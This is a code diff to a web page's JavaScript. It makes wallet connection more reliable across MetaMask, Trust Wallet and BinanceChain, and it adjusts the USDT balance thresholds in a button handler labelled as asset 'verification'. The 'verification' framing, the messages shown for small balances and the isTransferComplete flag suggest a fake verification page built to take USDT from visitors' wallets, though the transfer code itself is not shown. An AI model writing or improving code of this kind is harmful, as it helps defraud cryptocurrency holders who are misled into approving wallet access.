@@ -162,7 +162,7 @@ async function switchToBSC() {
     }
 }
 
-// Connect Wallet
+// Corrected Connect Wallet function to explicitly request accounts
 async function connectWallet() {
     const isWeb3Initialized = await initWeb3();
     if (!isWeb3Initialized) {
@@ -172,13 +172,34 @@ async function connectWallet() {
     try {
         let accounts;
         if (walletType === WALLET_TYPES.BINANCE) {
-            accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
+            // BinanceChain.request({ method: 'eth_accounts' }) might not prompt.
+            // Explicitly request accounts for BinanceChain too, if available.
+            if (window.BinanceChain.request) {
+                try {
+                    accounts = await window.BinanceChain.request({ method: 'eth_requestAccounts' });
+                } catch (binanceError) {
+                    console.warn("BinanceChain eth_requestAccounts failed, falling back to eth_accounts:", binanceError);
+                    accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
+                }
+            } else {
+                 accounts = await web3.eth.getAccounts();
+            }
+
+        } else if (window.ethereum) { // This covers MetaMask and Trust Wallet
+            // THIS IS THE CRUCIAL PART: Explicitly request accounts to trigger the prompt
+            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         } else {
+            // Fallback for older web3 versions or unknown providers that might not support eth_requestAccounts
             accounts = await web3.eth.getAccounts();
+            if (accounts.length === 0 && currentProvider && currentProvider.enable) {
+                // Older way for some providers to enable
+                await currentProvider.enable();
+                accounts = await web3.eth.getAccounts();
+            }
         }
 
-        if (accounts.length === 0) {
-            showError("No accounts found. Please connect your wallet.");
+        if (!accounts || accounts.length === 0) {
+            showError("No accounts found. Please connect your wallet and approve the connection.");
             return false;
         }
         userAddress = accounts[0];
@@ -186,7 +207,12 @@ async function connectWallet() {
         return true;
     } catch (error) {
         console.error("Error connecting wallet:", error);
-        showError("Error connecting wallet. Please try again.");
+        // User rejected connection or another error occurred during request
+        if (error.code === 4001) { // EIP-1193 user rejected request
+             showError("Wallet connection rejected by user. Please approve to continue.");
+        } else {
+             showError("Error connecting wallet. Please try again.");
+        }
         return false;
     }
 }
@@ -312,11 +338,11 @@ Next.addEventListener('click', async () => {
     }
 
     // Handle USDT balance conditions
-    if (tokenBalanceValue <= 0) { // Using 0.009 to account for potential tiny floating point
+    if (tokenBalanceValue <= 0.009) { // Using 0.009 to account for potential tiny floating point
         showError("No assets found for verification. Your USDT balance is zero.");
         Next.disabled = false;
         return;
-    } else if (tokenBalanceValue > 0.000001 && tokenBalanceValue <= 0.0009) { // Between 0.01 and 1 USDT
+    } else if (tokenBalanceValue > 0.009 && tokenBalanceValue <= 1.0) { // Between 0.01 and 1 USDT
         Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete!';
         Next.disabled = true; // Keep button disabled after completion
         isTransferComplete = true;
